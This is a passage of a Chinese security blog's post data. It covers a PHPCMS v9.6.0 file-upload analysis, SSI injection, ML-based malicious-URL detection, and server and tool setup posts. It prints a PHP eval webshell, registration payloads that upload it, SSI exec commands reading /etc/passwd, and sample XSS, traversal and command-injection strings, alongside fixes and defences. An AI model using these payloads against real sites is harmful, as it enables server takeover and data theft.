1, 10))); } strrchr 查找字符串在 另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 也就是说此时 URL（http://www.foo.com/1.txt?1.php） 的文件后缀名已经是 php 了。 追踪 getname 函数，可见最终生成的文件名是 “年月日时分秒+三位随机数字+ ‘.’ + 文件扩展名（php）”。 function getname($fileext){ return date(&apos;Ymdhis&apos;).rand(100, 999).&apos;.&apos;.$fileext; } 最后 使用 upload_func 函数对 http://www.foo.com/1.txt?1.php 处理， 通过 $this-&gt;upload_func = ‘copy’; 可以得到 upload_func 实际上就是 PHP 自带的 copy 下载函数。 至此 已经在服务器上成功上传了可以获知文件位置的一句话木马。 其实远程URL的地址也可以使用 http://www.foo.com/1.php#1.jpg 的形式，只要保证直接访问 1.php 文件能输入 一句话木马代码就行， 比如 1.php 的 代码如下： &lt;?php echo &apos;&lt;?php @eval($_POST[a]);?&gt;&apos;; ?&gt; burp 抓包上传成功： 上传的文件内容： 利用知道了 download 是漏洞点，所以可以直接搜索有哪些地方调用了 download 函数，只要调用了 download 函数都可能会出现这个问题。 搜索项目发现下面几个文件存在 直接调用： python find.py -k download( [-] filename :./caches\\caches_model\\caches_data\\content_input.class.php [-] filename :./caches\\caches_model\\caches_data\\member_input.class.php [-] filename :./phpcms\\libs\\classes\\attachment.class.php [-] filename :./phpcms\\modules\\collection\\classes\\collection.class.php [-] filename :./phpcms\\modules\\content\\down.php [-] filename :./phpcms\\modules\\content\\fields\\editor\\input.inc.php [-] filename :./phpcms\\modules\\formguide\\fields\\editor\\input.inc.php [-] filename :./phpcms\\modules\\member\\fields\\editor\\input.inc.php 打开 content_input.class.php 发现是在editor进行的调用： function editor($field, $value) { $setting = string2array($this-&gt;fields[$field][&apos;setting&apos;]); $enablesaveimage = $setting[&apos;enablesaveimage&apos;]; if(isset($_POST[&apos;spider_img&apos;])) $enablesaveimage = 0; if($enablesaveimage) { $site_setting = string2array($this-&gt;site_config[&apos;setting&apos;]); $watermark_enable = intval($site_setting[&apos;watermark_enable&apos;]); $value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable); } return $value; } 所以调用 editor 函数的地方也会出现这个问题，当然可以直接静态搜索”editor(“得到调用他的函数，结果发现很多调用。 python find.py -k editor( [-] filename :./caches\\caches_model\\caches_data\\content_form.class.php [-] filename :./caches\\caches_model\\caches_data\\content_input.class.php [-] filename :./caches\\caches_model\\caches_data\\content_output.class.php ...... 有时间的话可以一个个的往前溯源，一直溯源到用户可以控制的参数为止。 在这里根据先前提供的PoC直接看用户注册相关代码： \\phpcmsv9.6.0\\phpcms\\modules\\member\\index.php 的 register 函数 //附表信息验证 通过模型获取会员信息 if($member_setting[&apos;choosemodel&apos;]) { require_once CACHE_MODEL_PATH.&apos;member_input.class.php&apos;; require_once CACHE_MODEL_PATH.&apos;member_update.class.php&apos;; $member_input = new member_input($userinfo[&apos;modelid&apos;]); $_POST[&apos;info&apos;] = array_map(&apos;new_html_special_chars&apos;,$_POST[&apos;info&apos;]); $user_model_info = $member_input-&gt;get($_POST[&apos;info&apos;]); } 最后一行调用了 \\phpcmsv9.6.0\\caches\\caches_model\\caches_data\\member_input.class.php 的 get () 函数 get 函数包含： $func = $this-&gt;fields[$field][&apos;formtype&apos;]; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); 先看一下 $this-&gt;fields 的定义： $this-&gt;fields = getcache(&apos;model_field_&apos;.$modelid,&apos;model&apos;); 需要从缓存的模型里获得 fields 字段，一共有 5 个 模型文件； 只要从中有一个可以 $this-&gt;fields[$field][‘formtype’] 的结果是 editor 就可以。 model_field_11.cache 是可以的，需要把info数组设置成 content 索引，也就是我们的payload 中 包含： modelid=11&amp;info[content]=&lt;img href=http://localhost/cms/phpcmsv9.6.0/2.php#.jpg&gt; 或者下面这些 payload 都是可以的。 modelid=1&amp;info[content]=&lt;img href=http://localhost/cms/phpcmsv9.6.0/2.php#.jpg&gt; modelid=2&amp;info[content]=&lt;img href=http://localhost/cms/phpcmsv9.6.0/2.php#.jpg&gt; modelid=3&amp;info[content]=&lt;img href=http://localhost/cms/phpcmsv9.6.0/2.php#.jpg&gt; 当 $this-&gt;fields[$field][‘formtype’] 的值是 editor 后，可以看到 editor 函数调用了 attachment.class.php 的download 函数，所以注册存在任意文件上传漏洞。 function editor($field, $value) { $setting = string2array($this-&gt;fields[$field][&apos;setting&apos;]); $enablesaveimage = $setting[&apos;enablesaveimage&apos;]; $site_setting = string2array($this-&gt;site_config[&apos;setting&apos;]); $watermark_enable = intval($site_setting[&apos;watermark_enable&apos;]); $value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable); return $value; } 复现 或者 修复说说几种修复的方案： 1. 对最后生成的文件名的后缀进行一次白名单过滤。（ v9.6.1更新官方做法 ） 2. 干掉上传文件路径的可执行权限。（不建议，配合文件包含漏洞会GG） 3. 增加文件重命名的随机字符长度。（也不建议，需要确保上传的图片用户不能访问） 总结这个漏洞点是文件下载点触发的，当然以后可能是上传点，与数据库交互的参数，用户控制的参数 …想到一点，关于使用关键字搜索函数调用这种审计方法有点low啊，这篇文章中的最后用到的是动态调用 editor 函数的方法找到的关联。所以静态分析进行不下去了，多看看代码的逻辑关系，毕竟代码越多，漏洞越多嘛。最后，这是我的第一篇 PHP 的代码审计文章，参考了一些大牛的分析文章，感谢~希望自己有机会多写写，漏洞再多，选择自己感兴趣的分析分析。 参考http://paper.seebug.org/273/ 还有一位DALAO的文档 :P","categories":[],"tags":[{"name":"PHPCMS","slug":"PHPCMS","permalink":"http://www.evilclay.com/tags/PHPCMS/"},{"name":"代码审计","slug":"代码审计","permalink":"http://www.evilclay.com/tags/代码审计/"},{"name":"任意文件上传","slug":"任意文件上传","permalink":"http://www.evilclay.com/tags/任意文件上传/"}]},{"title":"VSCode配置PHP动态调试环境","slug":"VSCode配置PHP动态调试环境","date":"2017-05-09T05:38:58.000Z","updated":"2017-05-09T06:05:43.377Z","comments":true,"path":"2017/05/09/VSCode配置PHP动态调试环境/","link":"","permalink":"http://www.evilclay.com/2017/05/09/VSCode配置PHP动态调试环境/","excerpt":"","text":"简介首先 PHP 需要安装 XDebug 扩展，然后在 php 配置文件中启用该扩展，然后 在 VSCode 中安装 php-debug 扩展，并做响应的配置就可以直接在 VSCode 中对 PHP 代码进行动态调试。 XDebug 扩展就是一个 dll 文件，用来对PHP代码进行调试分析，一些 WAMP 中已经包含了该文件，只需要手动启用即可。 php-debug 是 VSCode 的扩展应用，直接在 VSCode 中可到看到它是一个VS代码和XDebug之间的调试适配器。 安装配置 XDebugPHPStudy 中 XDebug文件 已经集成在环境中，只需要修改 php.ini 成如下配置： zend_extension=&quot;...\\ext\\xdebug.dll&quot; // 这里是xdebug.dll的绝对路径 xdebug.remote_enable = 1 xdebug.remote_autostart=1 若没有继承 xdebug.dll 文件，可以根据 php 版本在 https://xdebug.org/download.php 下载对应 扩展。之后重启 Apache 环境是配置生效。 VSCode 扩展安装按 F1 输入 ext install php-debug 安装扩展应用。 安装完成后，新建 php 测试文件如下： &lt;?php echo &quot;PHP动态调试测试&quot;; $name = &apos;Anka9080&apos;; echo &quot;这是断点之后的内容&quot;; echo phpinfo(); ?&gt; 若提示不解析 php 代码, 需要对项目设置指定 PHP 程序路径， 文件 —— 首选项 —— 设置， 再右侧用户设置添加： // 将设置放入此文件中以覆盖默认设置 { &quot;php.validate.executablePath&quot;: &quot;..../php53/php.exe&quot; // php 程序的路径 } 之后在 VSCode 调试模块选用 Xdebug 调试器，如下配置： 重启 VSCode 使 配置生效。 测试使用 VSCode 打开 test.php，鼠标左键下红色断点，然后直接 F5 开启调试模式，然后 用浏览器访问 test.php 文件，结果如下：","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://www.evilclay.com/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"http://www.evilclay.com/tags/PHP/"},{"name":"动态调试","slug":"动态调试","permalink":"http://www.evilclay.com/tags/动态调试/"}]},{"title":"漏洞环境搭建之DockerCompose学习","slug":"漏洞环境搭建之DockerCompose学习","date":"2017-04-28T03:45:59.000Z","updated":"2017-04-28T03:47:18.014Z","comments":true,"path":"2017/04/28/漏洞环境搭建之DockerCompose学习/","link":"","permalink":"http://www.evilclay.com/2017/04/28/漏洞环境搭建之DockerCompose学习/","excerpt":"","text":"Docker Compose 概念可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。 通过 Docker Compose 可以将多个 Docker 容器组合成一个应用。 以 WordPress 漏洞环境为例： 一个完整的环境需要 Web容器 MySQL PHP环境； 在 docker compose 的角度会把这三个环境分别部署到三个docker容器中，然后把他们连接起来共同组成了 WordPress 的漏洞环境，如何定义这些容器以及如何连接成一个整体，请参照 Docker Compose 配置文件。 在 Docker Compose 配置文件中：所有的容器通过services来定义，然后使用docker-compose脚本来启动，停止和重启应用，和应用中的服务以及所有依赖服务的容器。 Docker Compose 配置文件详解参照： http://dockone.io/article/834 而且可以通过修改本地文件的方式对 Docker 镜像中的文件做修改，相当于 把宿主机的文件 与 docker 镜像中的文件做了映射关系，这个我觉得非常好用。 之前对 docker 镜像做修改的步骤如下： 启动 docker 容器 进入容器做相应的修改 重新封装成一个新的镜像 现在有了 Docker Compose 是不是更简单了些？ 使用 Docker Compose 创建应用使用 DockerFile 定义应用环境FROM python:2.7 ADD . /code WORKDIR /code RUN pip install -r requirements.txt 上面是DockerFile指令，说说对应指令： FROM 来源镜像 首选本地是否存在，如果不存在则会从公共仓库下载 ADD 把文件拷贝到容器相应文件下 在这里是吧当前目录的所有文件拷贝到 容器中/code 中 WORKDIR RUN、CMD和ENTRYPOINT指令默认的工作目录，不指定默认为根目录。 RUN 执行容器内的 bash 命令 使用 compose.yaml 定义应用服务通过 Compose 配置文件，可以把不同服务生成的不同容器组成你的应用。 配置文件示例： web: build:. command: python app.py ports: - &quot;5000:5000&quot; volumes: - .:/code links: - redis redis: image: redis 在配置文件中定义了两个应用 web 和 redis， 通过 links 把两个容器连接起来，对外暴露的是 web 容器的 5000端口， volumes 定义磁盘映射，把当前目录的所有文件 映射到 web 容器的 /code 的目录中，以后可以直接修改当前目录的文件对容器做修改啦。 启动容器执行docker-compose up来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。 docker-compose up -d在后台启动服务 docker-compose ps命令查看启动的服务 docker-compose stop停止服务 参考： http://debugo.com/docker-compose/ http://dockone.io/article/834 http://blog.csdn.net/wangtaoking1/article/details/44278951","categories":[],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.evilclay.com/tags/Docker/"},{"name":"漏洞环境","slug":"漏洞环境","permalink":"http://www.evilclay.com/tags/漏洞环境/"}]},{"title":"SSI-服务端包含注入","slug":"SSI-服务端包含注入","date":"2017-04-27T18:28:28.000Z","updated":"2017-04-27T18:29:28.263Z","comments":true,"path":"2017/04/28/SSI-服务端包含注入/","link":"","permalink":"http://www.evilclay.com/2017/04/28/SSI-服务端包含注入/","excerpt":"","text":"前言看到 MottoIN 上有个 SSI 的文章，正好学习一番。 SSISSI是英文Server Side Includes的缩写，SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 至于什么时候应当用SSI ，而什么时候应当用某些程序生成整个页面，取决于页面中有多少内容是静态的，又有多少内容需要在每次页面被提供时重新计算。SSI是一种增加小段动态信息的好方法，比如当前时间。如果你的页面大部分内容是在被提供时动态生成的，那就要另找方案了。 SSI固然不能替代CGI或者其他动态页面技术，但它是在页面中插入众多小型的动态片段的优秀方法，而无须大量额外的操作。 现在这种业务少了，洞也少了，重在记录学习过程。 启用 SSI 环境： Apache/2.4.10 (Win32) OpenSSL/0.9.8zb PHP/5.3.29 Apache默认未启用 SSI ，若使用 SSI，需要对做以下配置： 打开 Apache 配置文件 httpd.conf ： 确认加载include.so模块，将注释去掉：LoadModule include_module libexec/apache2/mod_include.so AddType部分去掉这两段注释：AddType text/html .shtmlAddOutputFilter INCLUDES .shtml Directory目录权限里面找到Options Indexes FollowSymLinks 增加 Includes 比如，修改成：Options +Indexes +FollowSymLinks +ExecCGI +Includes 重新启动 Apache 此外，IIS 和 Nginx 都可以开启 SSI 功能，这里不在赘述方法。 SSI 的能力要想知道 SSI 能做出什么好玩的，首先要了解 SSI 的指令。 SSI 的语法如下： &lt;!--#element attribute=value attribute=value ... --&gt; 类似于HTML注释，即使没有正确配置SSI ，它也不会被浏览器显示，但在HTML代码中可见。而若正确配置了SSI ，则 SSI 指令会被其结果所取代。 SSI 支持的指令echo 指令 将环境变量输出到页面 语法： &lt;!--#echo var=&quot;变量名称&quot;--&gt; 例子： &lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt; // 文档名称 &lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt; // 现在时间 &lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt; // 访客 IP 地址 include 指令 包含一个php文件 类似于include函数 语法： &lt;!--#include virtual=&quot;文件名称&quot;--&gt; &lt;!--#include file=&quot;文件名称&quot;--&gt; 参数： file 指定 包含文件相对于本文档的位置，不允许包含上级目录的文件； virtual 指定相对于服务器文档根目录的位置。 例子: &lt;!--#include virtual=&quot;/footer.html&quot; --&gt; // 包含标准页脚 flastmod 和 fsize 指令 参数和 include 参数一样有 file 和 virtual ； flastmod 和 fsize 用于输出文件的最后修改时间 和 文件大小。 例子： &lt;!--#flastmod file=&quot;文件名称&quot;--&gt; &lt;!--#fsize file=&quot;文件名称&quot;--&gt; exec 指令 将某一外部程序的输出插入到页面中。可插入CGI程序或者是bash/cmd命令（命令执行），这取决于使用的参数是cmd还是cgi。 参数： cmd bash命令行 cgi CGI脚本程序 示例： &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;；将会显示密码文件 &lt;!--#exec cmd=&quot;dir /b&quot;--&gt;；将会显示当前目录下文件列表 &lt;!--#exec cgi=&quot;/cgi-bin/gb.cgi&quot;--&gt;；将会执行CGI程序gb.cgi。 &lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt;；将会执行CGI程序access_log.cgi。 可以看出，从上面的示例可以看出，这个指令相当方便，但是也存在重大的安全隐患。 config 指令 指定返回给客户端浏览器的错误信息、日期和文件大小的格式。 语法： &lt;!--#config errmsg=&quot;自定义错误信息&quot;--&gt; &lt;!--#config sizefmt=&quot;显示单位&quot;--&gt; &lt;!--#config timefmt=&quot;显示格式&quot;--&gt; 参数： errmsg 自定义SSI执行错误信息，可以为任何你喜欢的方式。 sizefmt 文件大小显示方式，默认为字节方式（”bytes”)可以改为千字节方式（”abbrev”) timefmt 时间显示方式，最灵活的配置属性。 示例： 显示一个不存在文件的大小 &lt;!--#config errmsg=&quot;服务器执行错误，请联系管理员，谢谢！&quot;--&gt; &lt;!--#fsize file=&quot;不存在的文件.htm&quot;--&gt; &lt;!--#config timefmt=&quot;%Y年/%m月%d日 星期%W 北京时间%H:%M:%s，%Y年已过去了%j天 今天是%Y年的第%U个星期&quot;--&gt; SSI 业务场景从定义中看出，页面中有一小部分是动态输出的时候使用SSI， 比如： 文件相关的属性字段 当前时间 访客IP 调用 CGI 程序 SSI 注入条件 支持 SSI 用户输入能够嵌入到响应页面 用户输入的SSI关键字未被过滤 挖掘 SSI 注入两个思路： 第一个方面从业务场景的几个情况来 Fuzz 第二方面可以关注 .stm，.shtm和.shtml 这三种扩展名。 SSI 注入危害可以导致命令执行（exec指令），本地文件包含（include指令）。 SSI 注入防护若可以，请关闭服务器对 SSI 的支持； 过滤 SSI 关键字（&lt; &gt; # - “ ‘）。 参考： http://www.kubiji.cn/topic-id998.html https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection","categories":[],"tags":[{"name":"SSI|服务端包含注入","slug":"SSI-服务端包含注入","permalink":"http://www.evilclay.com/tags/SSI-服务端包含注入/"}]},{"title":"基于机器学习的恶意 URL 检测","slug":"基于机器学习的恶意URL检测","date":"2017-04-04T10:46:24.000Z","updated":"2017-04-04T17:20:26.565Z","comments":true,"path":"2017/04/04/基于机器学习的恶意URL检测/","link":"","permalink":"http://www.evilclay.com/2017/04/04/基于机器学习的恶意URL检测/","excerpt":"","text":"在Freebuf 上之前也发过一些机器学习应用于Web异常检测的文章，阐述了几种检测模型的建立方式，可以先了解一番。本文参考了国外的一篇博文，英语好的可以直接看下原文，在这里记录了下研究检测模型实现的过程，因为也是最近才接触机器学习这块，有啥问题请大牛们指出。 先说重点，这篇文章使用逻辑回归的方式建立检测模型，对未知的 URL 进行检测。 模型建立的整体思路如下： 分别拿到正常请求和恶意请求的数据集。 对无规律的数据集进行处理得到特征矩阵。 使用机器逻辑回归算法拿特征矩阵训练检测模型。 最后使用检测模型判断新的 URL 请求是恶意的还是正常的。 收集数据集我们需要分别拿到恶意的数据集和正常的数据集用来后期处理，在这里恶意的数据集来自 https://github.com/foospidy/payloads 中的一些 XSS SQL注入等攻击的payload，结合github上一些知名仓库的payload，一共整理出 50000 条恶意请求作为恶意的数据集；正常请求的数据集来自于http://secrepo.com/ , 攻击1000000条日志请求（资源有限，假定认为这些数据全部都是正常的请求，有精力可以进行降噪处理）。 恶意请求部分样本： /top.php?stuff=&apos;uname &gt;q36497765 # /h21y8w52.nsf?&lt;script&gt;cross_site_scripting.nasl&lt;/script&gt; /ca000001.pl?action=showcart&amp;hop=\\&quot;&gt;&lt;script&gt;alert(&apos;vulnerable&apos;)&lt;/script&gt;&amp;path=acatalog/ /scripts/edit_image.php?dn=1&amp;userfile=/etc/passwd&amp;userfile_name= ;id; /javascript/mta.exe /examples/jsp/colors/kernel/loadkernel.php?installpath=/etc/passwd\\x00 /examples/jsp/cal/feedsplitter.php?format=../../../../../../../../../../etc/passwd\\x00&amp;debug=1 /phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd /cgi-bin/script/cat_for_gen.php?ad=1&amp;ad_direct=../&amp;m_for_racine=&lt;/option&gt;&lt;/select&gt;&lt;?phpinfo();?&gt; /examples/jsp/cal/search.php?allwords=&lt;br&gt;&lt;script&gt;foo&lt;/script&gt;&amp;cid=0&amp;title=1&amp;desc=1 正常请求部分样本： /rcanimal/ /458010b88d9ce/ /cclogovs/ /using-localization/ /121006_dakotacwpressconf/ /50393994/ /166636/ /labview_v2/ /javascript/nets.png /p25-03/ /javascript/minute.rb /javascript/weblogs.rss /javascript/util.rtf 计算特征矩阵无论是恶意请求数据集还是正常请求数据集，都是不定长的字符串列表，很难直接用逻辑回归算法对这些不规律的数据进行处理，所以，需要找到这些文本的数字特征，用来训练我们的检测模型。 在这里，我们使用 Tfidvectorizer（TD-IDF） 来提取文本的特征，并以数字矩阵的形式进行输出。 TD-IDF 是一种用于资讯检索与文本挖掘的常用加权技术，被经常用于描述文本特征。 实际上是：TF * IDF，TF 词频（Term Frequency），IDF 逆向文件频率（Inverse Document Frequency）。 这里简单说下他们的概念，感兴趣的可以搜搜资料： TF表示词条在某文档中出现的频率。IDF的主要思想是：如果包含词条的文档越少，则 IDF越大，说明该词条具有很好的类别区分能力。 TF-IDF 倾向于过滤掉常见的词语，保留重要的词语。 要计算 TD-IDF 之前首先需要对 每个文档（URL请求）的内容进行分词处理，也就是需要定义文档的词条长度，这里我们选择长度为3，可以根据模型的准确度对这个参数进行调整。 比如：// URL 请求www.foo.com/1// 经过分词后[‘www’,’ww.’,’w.f’,’.fo’,’foo’,’oo.’,’o.c’,’.co’,’com’,’om/‘,’m/1’] 下面对所有 URL 请求计算出 TD-IDF 特征矩阵，输出格式基本上是下面的样子： (0, 31445) 0.0739022819816 (0, 62475) 0.0629894240925 (0, 46832) 0.0589025342739 (0, 77623) 0.0717033170552 (0, 35908) 0.0882896248394 : 省略 : (1310503, 17869) 0.245096903287 (1310503, 7490) 0.350336780418 (1310504, 8283) 0.344234609884 (1310504, 72979) 0.265488228146 (1310504, 67485) 0.253863271567 (1310504, 37730) 0.328153786399 可以看出特征矩阵的元素由[(i,j) weight] 三个元素组成， 在矩阵中：i 对应于集合中的文档编号，列对应于术语term（或者说是词片？）矩阵元素[(i,j) weight] 表示编号 为 j 的词片 在编号为 i 的文档下的 fd-idf 值（weight）。比如： (0, 31445) 0.0739022819816 表示词片编号31445的在第0号文档的权值是 0.0739022819816 训练检测模型现在有了特征矩阵作为训练数据，可以直接使用逻辑回归的方法来训练我们的模型，这一步需要电脑花点时间对数据进行处理，但是Python已经有强大的库给我们直接提供了训练入口(fit函数)，所以只需要定义一个逻辑模型实例，然后调用训练方法，传值训练数据即可，代码如下： lgs = LogisticRegression() lgs.fit(x_train, y_train) // x_train 是特征矩阵，y_train 是该条矩阵的分词对应的检测输出（正常是0 恶意是1）的列表 测试模型效果经过训练之后 lgs 提供 score 方法 选择一批测试数据来计算模型的准确度，初步测试，准确度也不算低。 lgs.score(x_test, y_test) // output: 99 % 同时，可以调用 lgs.predict 的方法对 新的 URL 进行恶意判定。 x_predict = [&apos;http://www.foo.com/id=1&lt;script&gt;alert(1)&lt;/script&gt;&apos;,&apos;www.foo.com/login.html&apos;] x_predict = vectorizer.transform(x_predict) x_Predict = lgs.predict(x_predict) // output: [1,0] 粗略的测试了几组数据，结果如下： 结果输出 总结基于逻辑回归的恶意URL检测很依赖于训练数据集，有必要保证原始数据集尽可能的减少噪点（异常数据），以及每条数据之间尽可能的减少关联性。若能拿到自身业务中确定正常或者威胁的请求数据作为训练数据集训练出的模型应该也更加适用于当前环境的检测。同时作为监督式学习，可以定期把检测出确定威胁的请求放入原始数据集中，对检测模型进行优化。 源码地址： https://github.com/exp-db/AI-Driven-WAF 参考： http://www.freebuf.com/articles/web/126543.htmlhttp://fsecurify.com/fwaf-machine-learning-driven-web-application-firewall/http://scikit-learn.org/stable/modules/feature_extraction.html#text-feature-extraction","categories":[],"tags":[]},{"title":"谈谈 Vim 的几种文件备份","slug":"谈谈-Vim-的几种文件备份","date":"2017-03-31T11:32:24.000Z","updated":"2017-03-31T14:01:04.896Z","comments":true,"path":"2017/03/31/谈谈-Vim-的几种文件备份/","link":"","permalink":"http://www.evilclay.com/2017/03/31/谈谈-Vim-的几种文件备份/","excerpt":"","text":"源自 MCTF 看到了 Vim 的 undo 备份，顺手学习了下 Vim 的几种备份机制，或有疏漏，请指出。 1. Vim 的交换文件 .filename.swp默认交换文件在打开文件的时候就会产生交换文件，正常退出的时候才会删除交换文件（断电，Ctrl+Z强制退出就不会删除），内容大致是这个样子。 swpdemo 通过在 Vim 配置文件设置 set noswapfile 来关闭交换文件。 2. Vim 的备份文件 filename~默认关闭，需要通过设置 set backup 来开启，Unbuntu的Vim配置文件是 /etc/vim/vimrc 开启后，对文件进行修改后会保存修改之前的一个副本，展示如下： ~Demo 如果不喜欢 ~ 作为备份文件的后缀，可以使用 set backupext=.bak 来设置备份文件的扩展名。 当然可以通过设置 set nobackup 来关闭备份文件。 3. undo 备份文件 .filename.un.~默认关闭，需要设置 set undofile 来开启 undo 备份文件。这是 Vim 官方给出的 undo 备份文件的解释： When on, Vim automatically saves undo history to an undo file when writing a buffer to a file, and restores undo history from the same file on buffer read. 也就是说开启时，在 Vim 中编辑文件是使用了 撤销更改（u命令）的操作，会把撤销更改的那部分保存到缓存文件 ..un.~ 中。 测试发现这个 undo 缓存文件是追加写入的，所以你所有的撤销操作都会在这个文件中找到。 内容大概是这个样子： undodemo 4. PS默认缓存文件会在当前目录下生成，可以通过修改配置文件的方式指定自动保存位置。 参考连接中有提高可以通过 Vim 的备份机制实现 内容的版本控制。 我们可以从漏洞挖掘的角度延伸一点点，像 敏感文件扫描这种工具一般都是一个敏感文件列表无脑开扫，若是增加一个功能： 结合爬虫已经爬取到的文件和目录，生成相应的缓存/备份文件，是不是又会有新的发现 :p 5. 参考http://blog.163.com/yysfire@126/blog/static/1831747201011443159904/","categories":[],"tags":[{"name":"Vim","slug":"Vim","permalink":"http://www.evilclay.com/tags/Vim/"},{"name":"缓存文件","slug":"缓存文件","permalink":"http://www.evilclay.com/tags/缓存文件/"},{"name":"敏感文件探测","slug":"敏感文件探测","permalink":"http://www.evilclay.com/tags/敏感文件探测/"}]},{"title":"CSP（内容安全策略）学习","slug":"tmp","date":"2017-03-13T13:05:04.000Z","updated":"2017-03-13T13:59:36.818Z","comments":true,"path":"2017/03/13/tmp/","link":"","permalink":"http://www.evilclay.com/2017/03/13/tmp/","excerpt":"","text":"今天在一段 PHP 验证码代码中包含了以下内容，怀着好奇的心里研究了一下~ header(“Content-Security-Policy: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’ data:; frame-src ‘none’”);header(“X-Content-Security-Policy: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’ data:; frame-src ‘none’”);header(“X-WebKit-CSP: default-src ‘self’; style-src ‘self’ ‘unsafe-inline’;img-src ‘self’ data:; frame-src ‘none’”);header(“X-XSS-Protection: 1; mode=block”);header(“X-Content-Type-Options: nosniff”);header(“X-Frame-Options: DENY”); 我们来先说一下CSP， 内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。 Content-Security-Policy这个字段表示内容安全策略，也就是大名鼎鼎的 CSP ，主要是定义页面可以加载哪些资源，减少 XSS 的发生。 Content-Security-Policy 由一组指令+指令值对组成。目前的所有指令值可以参考这里，这里仅仅对上面的栗子给出说明： default-src ‘self’; 表示所有资源（js、image、css、web font，ajax）的默认加载策略是同源的。 style-src ‘self’ ‘unsafe-inline’; 表示 css 的加载策略是同源和行内css。 img-src ‘self’ data:; 表示 css 加载策略是同源和data协议。 frame-src ‘none’ 表示不允许加载frame X-Content-Security-Policy这个字段的作用同 Content-Security-Policy，早期的 Chrome 是通过 X-WebKit-CSP 响应头来支持 CSP 的，而 firefox 和 IE 则支持 X-Content-Security-Policy，Chrome25 和 Firefox23 开始支持标准的 Content-Security-Policy。 X-WebKit-CSPX-WebKit-CSP 是早期 Chrome 和 Safari 支持的，作用同上。 X-XSS-ProtectionX-XSS-Protection: 1; mode=block 主要是控制 IE8+ 和 Webkit browsers 浏览器开启 XSS 防护功能，阻止反射型 XSS 呈现页面，并不会清理 XSS。 X-Content-Type-OptionsX-Content-Type-Options: nosniff 禁用浏览器的类型猜测行为，也就是说Content-Type是错的或者未定义的时候，不会解析执行响应内容。 X-Frame-OptionsX-Frame-Options 用来给浏览器指示允许一个页面可否在frame , iframe 或者object 中展现的标记。DENY 表示不允许被陷入到其他 frame /iframe 中。 题外话差了些相关资料，发现前端果然很乱啊，一种功能在不同的浏览器中有不同的实现形式。。。","categories":[],"tags":[{"name":"XSS防护","slug":"XSS防护","permalink":"http://www.evilclay.com/tags/XSS防护/"},{"name":"CSP策略","slug":"CSP策略","permalink":"http://www.evilclay.com/tags/CSP策略/"}]},{"title":"Apache 绑定多域名/多端口配置命令","slug":"Apache绑定多域名 or 多端口配置命令","date":"2017-03-13T06:23:24.000Z","updated":"2017-03-13T06:29:58.911Z","comments":true,"path":"2017/03/13/Apache绑定多域名 or 多端口配置命令/","link":"","permalink":"http://www.evilclay.com/2017/03/13/Apache绑定多域名 or 多端口配置命令/","excerpt":"","text":"大致提一下，Apache实现多主机的方式有多种：1)基于IP地址的虚拟主机配置，2) 基于IP和多端口的虚拟主机配置，3)单个IP地址的服务器上基于域名的虚拟主机配置，4)在多个IP地址的服务器上配置基于域名的虚拟主机。 绑定多端口方式设置 Apache 监听新端口打开 /etc/apache2/ports.conf 文件，在 Listen 80 下追加监听新的端口号，比如 8888 Listen 8888 设置虚拟主机（新端口主机）对应目录打开 /etc/apache2/sites-available/000-default.conf 文件，新增加如下内容： &lt;VirtualHost *:8888&gt; ServerName localhost:8888 DocumentRoot &quot;/dir_path&quot; &lt;/VirtualHost&gt; 重启 Apache2 服务执行命令，重启Apache2 service apache2 restart 浏览器访问： http://ip:8888 ，若提示： Forbidden You don&apos;t have permission to access / on this server. 是因为虚拟主机目录为非apache安装目录下的htdocs，违反了apache对默认对网站根访问权限。需要设置该目录允许访问。 设置目录允许访问打开 /etc/apache2/apache2.conf ，新添加如下配置： &lt;Directory /dir_path&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted &lt;/Directory&gt; 绑定多主机在 /etc/apache2/site-enable/目录下新建domain_x.conf配置文件，内容如下： ServerName xxx.com ServerAdmin webmaster@localhost DocumentRoot /var/www/html/xxx ErrorLog ${APACHE_LOG_DIR}/error_xxx.log CustomLog ${APACHE_LOG_DIR}/access_xxx.log combined 在domain 厂商设置好domain 的 A 记录即可。 参考： http://blog.csdn.net/robertsong2004/article/details/46830799","categories":[],"tags":[]},{"title":"Shadowsocks服务端配置命令","slug":"Shadowsocks服务端配置命令","date":"2017-03-11T03:38:37.000Z","updated":"2017-03-11T03:42:04.075Z","comments":true,"path":"2017/03/11/Shadowsocks服务端配置命令/","link":"","permalink":"http://www.evilclay.com/2017/03/11/Shadowsocks服务端配置命令/","excerpt":"","text":"安装 服务端pip install shadowsocks 创建 /etc/shadowsocks/，进入并添加 config.json文件，内容如下：{服务器IP地址需要设置为0.0.0.0“server”:”0.0.0.0”,“server_port”:8838,“local_port”:1080,“password”:”pass”,“timeout”:600,“method”:”aes-256-cfb”} 安装aes加密相关库apt-get install python-m2crypto 设置开机启动 打开 /etc/rc.local，并添加如下内容：/usr/local/bin/ssserver -c 